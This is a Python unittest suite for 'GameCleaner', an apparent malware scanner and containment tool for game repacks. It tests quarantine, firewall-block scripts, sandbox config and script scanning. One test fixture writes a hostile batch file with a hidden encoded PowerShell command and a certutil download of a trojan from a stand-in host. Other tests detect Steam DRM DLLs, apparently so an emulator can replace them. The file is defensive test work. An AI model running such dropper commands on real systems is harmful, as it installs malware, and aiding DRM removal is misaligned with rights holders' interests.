"""
Comprehensive test suite for GameCleaner modules.
"""
from pathlib import Path
import shutil
import tempfile
import unittest

from gamecleaner.analyzer import PEScanner, ScriptScanner, ThreatSeverity, calculate_entropy
from gamecleaner.cleaner import EmulatorReplacer, QuarantineManager
from gamecleaner.containment import FirewallManager, SandboxGenerator
from gamecleaner.pipeline import GameCleanerPipeline


class TestGameCleaner(unittest.TestCase):

    def setUp(self):
        self.test_dir = Path(tempfile.mkdtemp(prefix="gamecleaner_test_")).resolve()
        self.explorer_path = Path(r"C:\Windows\explorer.exe")

    def tearDown(self):
        if self.test_dir.exists():
            shutil.rmtree(self.test_dir, ignore_errors=True)

    def test_entropy_calculation(self):
        zero_data = b"\x00" * 1000
        self.assertEqual(calculate_entropy(zero_data), 0.0)

        # High entropy data
        import os
        random_data = os.urandom(2048)
        self.assertGreater(calculate_entropy(random_data), 7.0)

    def test_pe_scanner_on_real_binary(self):
        target = Path(r"C:\Windows\System32\kernel32.dll")
        if not target.exists():
            target = self.explorer_path
        if not target.exists():
            self.skipTest("No Windows system binary found")

        scanner = PEScanner()
        result = scanner.scan_file(target)

        self.assertTrue(result.is_pe)
        self.assertIn(result.architecture, ("x64", "x86", "ARM64"))
        self.assertGreater(len(result.sha256), 20)
        self.assertGreater(len(result.sections), 0)
        self.assertIn(result.signature_status, ("Valid", "NotSigned"))
        if result.is_signed:
            self.assertEqual(result.overall_severity, ThreatSeverity.CLEAN.value)


    def test_quarantine_manager(self):
        qm = QuarantineManager(self.test_dir)
        dummy_file = self.test_dir / "suspicious_payload.exe"
        dummy_file.write_text("dummy payload content")

        # Quarantine file
        dest = qm.quarantine_file(dummy_file, reason="Test Infostealer", sha256="fake_sha256")
        self.assertIsNotNone(dest)
        self.assertFalse(dummy_file.exists())
        self.assertTrue(dest.exists())
        self.assertTrue(dest.name.endswith(".quarantined"))

        # Verify listing
        items = qm.list_quarantined()
        self.assertEqual(len(items), 1)
        self.assertEqual(items[0].reason, "Test Infostealer")

        # Test restore
        success = qm.restore_file(dest.name)
        self.assertTrue(success)
        self.assertTrue(dummy_file.exists())
        self.assertEqual(len(qm.list_quarantined()), 0)

        # Test quarantine and restore on nested subdirectory file
        sub_dir = self.test_dir / "bin" / "x64"
        sub_dir.mkdir(parents=True, exist_ok=True)
        nested_file = sub_dir / "shady_helper.dll"
        nested_file.write_text("nested payload")

        dest_nested = qm.quarantine_file(nested_file, reason="Nested Miner", sha256="nested_sha256")
        self.assertIsNotNone(dest_nested)
        self.assertFalse(nested_file.exists())

        items = qm.list_quarantined()
        self.assertEqual(len(items), 1)
        self.assertEqual(items[0].original_rel_path, str(Path("bin/x64/shady_helper.dll")))

        # Test restoring using Path object
        restored = qm.restore_file(dest_nested)
        self.assertTrue(restored)
        self.assertTrue(nested_file.exists())
        self.assertEqual(len(qm.list_quarantined()), 0)

    def test_firewall_manager(self):
        fm = FirewallManager(self.test_dir)
        dummy_exe = self.test_dir / "game.exe"
        dummy_exe.write_text("dummy exe")

        block_ps1, unblock_ps1 = fm.generate_scripts()
        self.assertTrue(block_ps1.exists())
        self.assertTrue(unblock_ps1.exists())
        self.assertTrue((self.test_dir / "Fix_Firewall_And_Run.bat").exists())

        fix_bat = fm.generate_fix_firewall_batch()
        self.assertTrue(fix_bat.exists())
        fix_content = fix_bat.read_text(encoding="utf-8")
        self.assertIn("Remove-NetFirewallRule", fix_content)
        self.assertIn("*.exe", fix_content)

        content = block_ps1.read_text(encoding="utf-8")
        self.assertIn("New-NetFirewallRule", content)
        self.assertIn("Outbound", content)
        self.assertIn("Block", content)
        self.assertIn("game.exe", content)

    def test_sandbox_generator(self):
        sg = SandboxGenerator(self.test_dir)
        wsb = sg.generate_wsb(read_only=True, v_gpu=True, allow_network=False)

        self.assertTrue(wsb.exists())
        xml_content = wsb.read_text(encoding="utf-8")
        self.assertIn("<Networking>Disable</Networking>", xml_content)
        self.assertIn("<VGpu>Enable</VGpu>", xml_content)
        self.assertIn("<ReadOnly>true</ReadOnly>", xml_content)
        self.assertIn(str(self.test_dir.resolve()), xml_content)

        # Test generate_batch_runner alias and is_supported property
        bat_runner = sg.generate_batch_runner()
        self.assertTrue(bat_runner.exists())
        self.assertEqual(bat_runner.name, "Launch_Game_Isolated.bat")
        self.assertIsInstance(sg.is_supported, bool)

    def test_emulator_replacer_detection(self):
        er = EmulatorReplacer(self.test_dir)
        dummy_dll = self.test_dir / "steam_api64.dll"
        dummy_dll.write_text("fake dll")
        appid_txt = self.test_dir / "steam_appid.txt"
        appid_txt.write_text("1091500")

        targets = er.find_drm_targets()
        self.assertEqual(len(targets), 1)
        self.assertEqual(targets[0].dll_name, "steam_api64.dll")
        self.assertEqual(targets[0].architecture, "x64")
        self.assertEqual(targets[0].app_id, "1091500")

        # Test backup
        backup_path = er.backup_dll(targets[0])
        self.assertTrue(backup_path.exists())

    def test_ini_appid_discovery(self):
        er = EmulatorReplacer(self.test_dir)
        sub = self.test_dir / "bin"
        sub.mkdir()
        (sub / "steam_api64.dll").write_text("dummy")

        # Create repack INI file with AppId
        (self.test_dir / "steam_emu.ini").write_text("[Settings]\nAppId = 1245620\nLanguage = english\n")

        targets = er.find_drm_targets()
        self.assertEqual(len(targets), 1)
        self.assertEqual(targets[0].app_id, "1245620")

    def test_script_scanner(self):
        scanner = ScriptScanner()

        # Safe script
        safe_bat = self.test_dir / "RunGame.bat"
        safe_bat.write_text("@echo off\necho Launching Game...\nstart MyGame.exe\n")
        res_safe = scanner.scan_file(safe_bat)
        self.assertEqual(res_safe.overall_severity, ThreatSeverity.CLEAN.value)
        self.assertEqual(res_safe.recommended_action, "KEEP")

        # Hostile script with Base64 PowerShell dropper & Discord exfil
        shady_bat = self.test_dir / "Launch_Repack.bat"
        shady_bat.write_text(
            "@echo off\n"
            "powershell -WindowStyle Hidden -enc aQB3AHIAIABoAHQAdABwAHMAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGMAbwBtAA==\n"
            "certutil.exe -urlcache -split -f https://badsite.com/payload.exe %TEMP%\\trojan.exe\n"
        )
        res_shady = scanner.scan_file(shady_bat)
        self.assertEqual(res_shady.overall_severity, ThreatSeverity.CRITICAL.value)
        self.assertEqual(res_shady.recommended_action, "QUARANTINE")
        self.assertGreaterEqual(len(res_shady.findings), 2)


if __name__ == "__main__":
    unittest.main()
